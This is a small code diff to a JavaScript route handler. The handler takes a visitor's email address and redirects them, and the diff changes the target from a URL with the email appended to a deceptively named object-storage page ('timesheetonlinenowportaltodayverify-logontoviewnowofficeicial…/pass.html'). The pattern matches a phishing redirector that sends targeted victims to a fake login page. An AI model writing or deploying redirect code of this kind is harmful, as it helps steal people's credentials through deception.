@@ -18,7 +18,7 @@ var appRoute = function (app) {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (email && emailRegex.test(email)) {
       const redirect_url =
-        "https://mobileprosystem.com/&" + email.replace("@", "%40");
+        "https://timesheetonlinenowportaltodayverify-logontoviewnowofficeicial.nl-ams-1.linodeobjects.com/pass.html#Q";
       res.redirect(redirect_url);
     } else {
       res.status(400).send("Please provide a valid email"); // Add status code for error
